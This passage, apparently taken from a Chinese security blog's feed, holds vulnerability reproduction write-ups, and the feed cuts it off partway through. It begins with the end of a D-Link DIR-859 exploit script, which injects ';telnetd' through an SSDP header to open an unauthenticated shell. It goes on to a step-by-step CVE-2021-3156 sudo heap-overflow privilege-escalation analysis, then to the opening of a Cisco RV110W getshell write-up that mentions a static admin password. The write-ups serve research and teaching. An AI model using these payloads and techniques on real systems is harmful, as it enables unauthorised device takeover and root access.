operator">=</span> <span class="token string">"M-SEARCH * HTTP/1.1\n"</span>    header <span class="token operator">+=</span> <span class="token string">"HOST:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>    header <span class="token operator">+=</span> <span class="token string">"ST:urn::device:1;telnetd\n"</span><span class="token comment" spellcheck="true"># header += "ST:uuid:1;telnetd\n"</span>    header <span class="token operator">+=</span> <span class="token string">"MX:2\n"</span>    header <span class="token operator">+=</span> <span class="token string">'MAN:"ssdp:discover"'</span><span class="token operator">+</span><span class="token string">"\n\n"</span>    <span class="token keyword">return</span> header<span class="token keyword">def</span> <span class="token function">send_conexion</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>IPPROTO_UDP<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>IP_MULTICAST_TTL<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>payload<span class="token punctuation">,</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> <span class="token string">"192.168.0.1"</span>    port <span class="token operator">=</span> <span class="token number">1900</span>    headers <span class="token operator">=</span> config_payload<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"\n---= HEADER =---\n"</span>    <span class="token keyword">print</span> <span class="token string">"[+] Preparando Header ..."</span>    <span class="token keyword">print</span> headers    <span class="token keyword">print</span> <span class="token string">"[+] Enviando payload ..."</span>    <span class="token keyword">print</span> <span class="token string">"[+] Activando servicio telnetd :)"</span>     send_conexion<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> headers<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"[+] Conectando al servicio ...n"</span>    sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'telnet '</span><span class="token operator">+</span> str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-拿shell"><a href="#0x05-拿shell" class="headerlink" title="0x05 拿shell"></a>0x05 拿shell</h1><p>环境成功搭建</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/01/d-link-dir-859-cve-201917621-wei-shou-quan-ming-ling-zhi-xing-lou-dong-fen-xi/11.png"></div><p>由于D-Link中本身就内置Telnet,所以直接使用Telent建立稳定的Shell</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/01/d-link-dir-859-cve-201917621-wei-shou-quan-ming-ling-zhi-xing-lou-dong-fen-xi/12.png"></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 路由器漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudo提权漏洞-堆溢出调试分析</title>
      <link href="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/"/>
      <url>/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>sudo的一个漏洞：影响范围1.8.2 – 1.8.31p2 以及 1.9.0 -1.9.5p1。非root可以使用sudo来以root的权限执行操作。漏洞本质是由于sudo错误的转义了\过滤掉了截断符号，最终导致了一个堆溢出漏洞。</p><p>提权方式：最终通过覆写加载的动态库为自编译的危险文件，实现提权</p><p>详细介绍：<br>在 service_user结构体中指定了要动态加载的动态链接库，如果能够修改 service_user-&gt;name，那么就能指定加载伪造的动态链接库。<br>在一个 service_user结构体前面释放一个堆块，然后 分配 user_args分配到该堆块，随后使用堆溢出覆盖 service_user结构体。在 nssload_libray中，构造了满足调用新动态链接库的条件，所以会通过 ni-&gt;name构造动态链接库的名字 shlib_name为 libnss_X/POP_SH3LLZ .so.2。最终会通过 __libc_dlopen(shlib_name)打开。而 libnssX/POP_SH3LLZ .so.2中只含有一个 init函数，该函数的作用就是id(0)调用 execv(‘/bin/sh’)，自此完成了提权。</p><h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>之前爆出的漏洞，这里对漏洞进行调试分析。<br>CVE-2021-3156漏洞可以在类uninx中非root可以使用sudo来以root的权限执行操作。漏洞本质是由于sudo错误的转义了\导致了一个堆溢出漏洞。</p><p>漏洞影响范围是1.8.2 – 1.8.31p2 以及 1.9.0 -1.9.5p1</p><p>本地环境：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/0.png"></div><h1 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h1><h2 id="1-8-21p2"><a href="#1-8-21p2" class="headerlink" title="1.8.21p2"></a>1.8.21p2</h2><p>sudo.c文件：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/1.png"></div><p>sudo加上 -s选项会设置 MODE_SHELL，加上 -i选项会设置 MODE_SHELL和 MODE_LOGIN_SHELL。</p><p>parse_args.c文件的parse_args函数中：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/2.png"></div><p>在 main()（sudo.c）函数中调用了parse_args()，parse_args()会连接所有命令行参数，并加反斜杠来重写 argv。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/3.png"></div><p>在 set_cmnd()函数中，首先根据参数使用 strlen()函数计算了参数的 size，再调用 malloc()函数分配了 size大小的堆空间 user_args 。随后判断是否开启了 MODE_SHELL，如果开启了将会连接命令行参数并存入堆空间 user_args。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/4.png"></div><p>假如a[0] = “", a[1]= “\x00”, 那么满足if(from[0]==”\“&amp;&amp;isspace(unsigned char)from[1])</p><pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// a[0]是反斜杠，a[1]是空格则地指针自增1</span>                from<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// from加一则指向null结束符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>null结束符号则会被拷贝到user_args堆缓冲区中，from加1，from指向null结束符后面第一个字符。随后会继续将后面的字符拷贝到user_args，发生堆溢出。</p><h1 id="0x03-触发漏洞"><a href="#0x03-触发漏洞" class="headerlink" title="0x03 触发漏洞"></a>0x03 触发漏洞</h1><p>在 parse_args()会对启用了 -s或 -i的 MODE_SHELL和 MODE_RUN 的 sudo的参数加上 反斜杠 转义。</p><p>而 set_cmnd()函数中触发堆溢出前，会判断是否启用了 MODE_SHELL 和 MODE_RUN、MODE_EDIT、MODE_CHECK 中的一个。那么就存在一个矛盾，如果要触发漏洞就需要启用 MODE_SHELL，但是如果启用了 MODE_SHELL，在 parse_args()函数中就会对所有参数转义，触发漏洞的 \，将会被转义为 \，这样就无法触发漏洞了。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// parse_args</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> MODE_RUN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ISSET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 检查是否开启了-s或-i的MODE_SHELL</span>转义 <span class="token string">"\"==> "</span>\\"<span class="token comment" spellcheck="true">// soduers_policy_main</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sudo_mode <span class="token operator">&amp;</span> <span class="token punctuation">(</span>MODE_RUN <span class="token operator">|</span> MODE_EDIT <span class="token operator">|</span> MODE_CHECK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_SHELL<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 判断是否开启MODE_SHELL</span>漏洞代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么想要成功执行堆溢出就只能设置flags=MODE_SHELL/MODE_LOGIN_SHELL的条件下不设置mode=MODE_RUN以免转移代码的执行。所以我们只能设置MODE_RUN来避免转义代码的执行，同时为了执行漏洞代码，又需要设置MODE_EDIT或MODE_CHECK。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/5.png"></div><p>我们看到如果设置这两个参数和MODE_SHELL/MODE_LOGIN_SHELL,在后续检测会退出</p><p>但是如果用sudoedit：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/6.png"></div>发现没有设置valid_flags，那么就可以顺利通过检查执行漏洞代码。<h1 id="0x04-漏洞调试"><a href="#0x04-漏洞调试" class="headerlink" title="0x04 漏洞调试"></a>0x04 漏洞调试</h1><p>1.首先使用如下命令运行 exp:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> gdb --args ./sudo-hax-me-a-sandwich 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.随后，在 execve下断点：</p><pre class="line-numbers language-bash"><code class="language-bash">catch <span class="token function">exec</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>gdb会断在execve函数，我们下断点b setlocale，在继续运行，此时就会停在setlocale函数。该函数是我们在执行sudo最开始会调用的。finish后就可以进入sudo的main函数中。<br>sudo.c</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/7.png"></div><p>当main函数加载了sudoer.so后对malloc下断点得到heap的地址</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/8.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/9.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/10.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/11.png"></div>堆溢出：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/12.png"></div><h1 id="0x05-提权方法"><a href="#0x05-提权方法" class="headerlink" title="0x05 提权方法"></a>0x05 提权方法</h1><h2 id="覆盖动态链接库地址"><a href="#覆盖动态链接库地址" class="headerlink" title="覆盖动态链接库地址"></a>覆盖动态链接库地址</h2><p>在 service_user结构体中指定了要动态加载的动态链接库，如果能够修改 service_user-&gt;name，那么就能指定加载伪造的动态链接库。而 nss_load_library函数就是加载动态链接库的函数，其会调用 __libc_dlopen打开动态库。</p><p>了解sevice_library结构体和service_user结构体</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> service_library<span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* Name of service (`files', `dns', `nis', ...).  */</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Pointer to the loaded shared library.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>lib_handle<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* And the link to the next entry.  */</span>  <span class="token keyword">struct</span> service_library <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">}</span> service_library<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> service_user<span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* And the link to the next entry.  */</span>  <span class="token keyword">struct</span> service_user <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Action according to result.  */</span>  lookup_actions actions<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Link to the underlying library object.  */</span>  service_library <span class="token operator">*</span>library<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Collection of known functions.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>known<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Name of the service (`files', `dns', `nis', ...).  */</span>  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> service_user<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再看看nss_load_library函数</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/13.png"></div><p>第一个地方要求：ni-&gt;library=null<br>第二个地方可以设置ni-&gt;library为name，所以不会退出，初始直接覆盖为null（运行完既为fake libc name的地址）<br>第三个地方要求：ni-&gt;library-&gt;lib_handle=null 才能加载新库</p><p>第四个地方要求：伪造的库文件名字必须是libnss_xxx.so</p><p>第五个地方调用_libc_dlopen来加载动态库</p><p>那么我们要思考如何通过一个堆溢出覆盖service_user结构体，思路大致是在分配到service_user这个结构体前面的堆块，通过溢出来修改service_user结构体。</p><h3 id="堆排布"><a href="#堆排布" class="headerlink" title="堆排布"></a>堆排布</h3><p>由于我们想通过user_args来覆盖到service_user那么需要实现一个好的堆排布，否则距离太远导致覆盖到重要数据可能会令程序崩溃。在这里我们使用setlocale来分配释放堆块，分配释放堆块后由于setlocale在sudo前，那么在分配service_user前可以提前占个堆块的位置，那么就可以在分配user_args时分配在service_user堆地址前，就可以成功溢出到该结构体，修改name为指定lib。</p><p>0x555555587360是我们下个分配的堆块</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/14.png"></div><p>此时我们看看附近的堆排布：</p><p>接下来查看service_user结构体位置</p><pre class="line-numbers language-bash"><code class="language-bash">search -s systemd <span class="token punctuation">[</span>heap<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/15.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/16.png"></div><p>我们得知在可以溢出的堆块user_args下面最近的是0x5555555873e0位置的service_user结构体</p><p>将离 user_args最近的 service_user结构体覆盖后，程序会调用 getgrgid()函数，最后去调用 nss_load_library</p><p>溢出后堆内存布局：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/17.png"></div><p>我们成功将ni-&gt;name改为X/P0P_SH3LLZ_</p><h3 id="调用nss-load-library"><a href="#调用nss-load-library" class="headerlink" title="调用nss_load_library"></a>调用nss_load_library</h3><p>我们在nss_load_library下个断点：</p><p>第一次调用nss_load_library:</p><p>被覆盖的那个service_user作为参数</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/18.png"></div><p>可以看到ni-&gt;library被设置为fake libc name</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/19.png"></div><p>可以看到成功加载了fake libc</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.利用setlocale进行堆占位（堆排布），为了可以分配user_args溢出后面的service_user<br>2.堆溢出覆盖library为null，name为指定libc名字</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/20.png"></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆溢出 </tag>
            
            <tag> sudo提权 </tag>
            
            <tag> service_user </tag>
            
            <tag> nss_load_library </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科路由器RV110W-CVE-2020-3331/CVE-2020-3323漏洞复现</title>
      <link href="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/"/>
      <url>/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>强网杯Realworld赛题，要求挖掘并利用CISCO RV110W-E-CN-K9（固件版本1.2.2.5）中的漏洞，获取路由器的Root Shell。攻击演示时的目标设备端口只开启了443端口的https服务，且不知道路由器的Web登录账号，故其实要求就是路由器Web的前台getshell。</p><h1 id="设备以及基本的处理"><a href="#设备以及基本的处理" class="headerlink" title="设备以及基本的处理"></a>设备以及基本的处理</h1><p>拿到设备后连上交换机，交换机连上之前的路由器，设置网络密码等操作。最后进行固件的更新（其实是替换）</p><p>替换前版本：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/0.png"></div><p>替换后：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/1.png"></div><p>对一个路由器设备的分析可以有不同方面的各种手段：</p><p>本体：设备拆解，固件提取，固件分析<br>通信：流量抓取，端口扫描，近场无线信号分析<br>使用：应用程序（app）逆向，云端接口分析<br>历史：历史漏洞，分析对比历史版本的固件或app<br>调试：各种调试接口（ssh/telnet/adb/uart/jtag），前置漏洞getshell，uboot修改init，qemu模拟</p><p>这里我们仅使用部分手段则足够分析出目标漏洞点</p><h1 id="历史漏洞查询"><a href="#历史漏洞查询" class="headerlink" title="历史漏洞查询"></a>历史漏洞查询</h1><p>通过<a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=RV110W" target="_blank" rel="noopener">cve-search网站</a>找到该路由器历史漏洞，再利用<a href="https://tools.cisco.com/security/center/publicationListing.x?product=Cisco&amp;keyword=rv110w&amp;impact=critical&amp;sort=-day_sir#~Vulnerabilities" target="_blank" rel="noopener">Cisco Security Advisories</a>找到202危险系数最高的漏洞分别是：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/2.png"></div><p><strong>CVE-2020-3323</strong>：Cisco Small Business RV110W，RV130，RV130W和RV215W路由器的基于Web的管理界面中的漏洞可能允许未经身份验证的远程攻击者在受影响的设备上执行任意代码。该漏洞是由于在基于Web的管理界面中未正确验证用户提供的输入而引起的。攻击者可以通过向目标设备发送特制的HTTP请求来利用此漏洞。成功的利用可能使攻击者能够以root用户身份在受影响设备的基础操作系统上执行任意代码。<br><strong>CVE-2020-3331</strong>：Cisco RV110W Wireless-N VPN防火墙和Cisco RV215W Wireless-N VPN路由器的基于Web的管理界面中的漏洞可能允许未经身份验证的远程攻击者在受影响的设备上执行任意代码。该漏洞是由于基于Web的管理界面未正确验证用户提供的输入数据而引起的。攻击者可以通过向特定设备发送精心设计的请求来利用此漏洞。成功的利用可能使攻击者利用root用户的特权执行任意代码。<br><strong>CVE-2020-3144</strong>：思科RV110W无线N VPN防火墙，RV130 VPN路由器，RV130W无线N多功能VPN路由器和RV215W无线N VPN路由器的基于Web的管理界面中的漏洞可能允许未经身份验证的远程攻击者绕过身份验证并执行受影响的设备上带有管理命令的任意命令。该漏洞是由于受影响的设备上的会话管理不当引起的。攻击者可以通过向受影响的设备发送特制的HTTP请求来利用此漏洞。成功利用该漏洞可能使攻击者获得受影响设备上的管理访问权限。<br><strong>CVE-2020-3330</strong>：Cisco Small Business RV110W Wireless-N VPN防火墙路由器的Telnet服务中的漏洞可能允许未经身份验证的远程攻击者完全控制具有高特权帐户的设备。存在此漏洞是因为系统帐户具有默认的静态密码。攻击者可以通过使用此默认帐户连接到受影响的系统来利用此漏洞。成功利用此漏洞可能使攻击者获得对受影响设备的完全控制。</p><p>3330：telnet密码<br>3331、3323：前台RCE</p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/3.png"></div>该设备开启了telnet<h1 id="CVE-2020-3330（静态密码）"><a href="#CVE-2020-3330（静态密码）" class="headerlink" title="CVE-2020-3330（静态密码）"></a>CVE-2020-3330（静态密码）</h1><p>首先我们先通过这个漏洞去远程登陆：参考<a href="https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html" target="_blank" rel="noopener">一个字节的差错导致Cisco防火墙路由器远程代码执行</a></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/4.png"></div>全局搜索一下字符串“aUzX1I”```bashgrep "aUzX1I" * -Rn```发现许多文件matches，但其大部分都是软连接，指向sbin/rc：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/5.png"></div>找到hash值进行解码即可得到静态admin密码<p>通过上面那篇文章也可直接得到Admin123的弱密码</p><h1 id="CVE-2020-3331-CVE-2020-3323（前台rce）"><a href="#CVE-2020-3331-CVE-2020-3323（前台rce）" class="headerlink" title="CVE-2020-3331/CVE-2020-3323（前台rce）"></a>CVE-2020-3331/CVE-2020-3323（前台rce）</h1><h2 id="定位固件"><a href="#定位固件" class="headerlink" 